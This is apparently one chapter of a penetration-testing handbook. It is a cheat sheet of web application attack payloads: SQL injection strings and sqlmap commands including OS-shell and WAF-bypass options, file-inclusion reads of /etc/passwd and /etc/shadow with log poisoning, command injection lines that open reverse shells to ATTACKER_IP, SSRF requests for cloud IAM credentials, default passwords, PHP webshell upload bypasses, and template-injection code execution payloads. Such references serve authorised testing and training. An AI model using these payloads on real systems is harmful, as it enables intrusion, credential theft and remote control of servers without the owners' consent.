[◀ Prev: Enumeration](03-enumeration.md) · [🏠 Index](README.md) · [Next: Initial Access ▶](05-initial-access.md)

---

# 04 · Web Application Attack Techniques

## 4.1 SQL Injection

### Manual Detection

```sql
-- Injection test payloads — try in every input field and URL parameter
'
''
' OR '1'='1
' OR 1=1--
' OR 1=1#
1' AND SLEEP(5)--    -- (blind time-based test)
1' AND 1=2--         -- (always false — content disappears = blind Boolean)
```

```bash
# sqlmap — automated SQL injection

# GET parameter
sqlmap -u 'http://$TARGET/page?id=1' --batch --dbs

# POST parameter
sqlmap -u 'http://$TARGET/login' --data='user=admin&pass=test' --batch --dbs

# From Burp Suite request file
sqlmap -r web/request.txt --batch --dbs

# Dump specific table
sqlmap -r web/request.txt --batch -D database -T users --dump

# Get OS shell (if FILE privilege and writable webroot)
sqlmap -r web/request.txt --batch --os-shell

# Bypass WAF
sqlmap -r web/request.txt --batch --tamper=space2comment,randomcase --level=5 --risk=3
```

## 4.2 File Inclusion (LFI/RFI)

```bash
# Basic LFI test payloads
?page=../../../etc/passwd
?file=../../../../etc/shadow
?include=../../../etc/passwd%00

# PHP wrapper — read source code as base64
?page=php://filter/convert.base64-encode/resource=index.php

# Log poisoning via User-Agent injection (then include log)
# Step 1: Inject PHP into User-Agent:
#   User-Agent: <?php system($_GET['cmd']); ?>
# Step 2: Include the log file:
?page=/var/log/apache2/access.log&cmd=whoami

# /proc/self/environ inclusion
?page=/proc/self/environ

# PHP input wrapper (POST body becomes code)
?page=php://input   + POST: <?php system('whoami'); ?>
```

## 4.3 Command Injection

```bash
# OS injection separator payloads
; id
& id
| id
&& id
|| id
`id`
$(id)

# Blind injection — time-based detection
; sleep 5
| sleep 5

# Reverse shell via command injection
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
| python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
```

## 4.4 SSRF (Server-Side Request Forgery)

```bash
# Internal network access
url=http://127.0.0.1/
url=http://localhost/
url=http://192.168.1.1/

# Read local files
url=file:///etc/passwd
url=file:///etc/shadow

# Cloud metadata endpoints
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF bypass techniques
url=http://127.1/            # Alternative notation
url=http://0x7f000001/       # Hex IP
url=http://[::1]/            # IPv6 localhost
url=http://017700000001/     # Octal
```

## 4.5 Authentication Bypass

```bash
# Default credentials to always try
admin:admin
admin:password
admin:123456
admin:admin123
root:root
root:toor
guest:guest
user:user
```

```bash
# Username enumeration via response difference
ffuf -u http://$TARGET/login -X POST \
  -d 'username=FUZZ&password=test' \
  -w /usr/share/seclists/Usernames/Names/names.txt \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -mr 'Invalid password'    # Match valid user error message

# JWT attacks
#   1. Decode JWT at jwt.io
#   2. Try alg:none
#   3. Try HS256 with weak secret: john jwt.txt --wordlist=rockyou.txt
#   4. RS256 to HS256 confusion
```

## 4.6 File Upload Bypass

```bash
# Step 1: Upload a legitimate file first, observe where it goes
# Step 2: Attempt PHP shell upload with various bypass methods:

# Extension bypass
shell.php -> shell.php5   shell.phtml   shell.phar   shell.php.jpg

# MIME type bypass (change Content-Type in Burp)
Content-Type: image/jpeg   (while uploading .php file)

# Magic bytes bypass
echo -e 'GIF89a\n<?php system(\$_GET[cmd]); ?>' > shell.gif

# Double extension
shell.jpg.php   shell.php.jpg

# Access uploaded shell
curl 'http://$TARGET/uploads/shell.php?cmd=id'
```

## 4.7 Template Injection (SSTI)

```bash
# Detection payloads — inject into all input fields
{{7*7}}      -> 49        = Jinja2/Twig
#{7*7}       -> 49        = Ruby ERB
${7*7}       -> 49        = Freemarker
<%= 7*7 %>   -> 49        = Ruby ERB
{{7*'7'}}    -> 7777777   = Jinja2 | 49 = Twig

# RCE via Jinja2 SSTI
{{config.from_object('os')}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig RCE
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

---

[◀ Prev: Enumeration](03-enumeration.md) · [🏠 Index](README.md) · [Next: Initial Access ▶](05-initial-access.md)
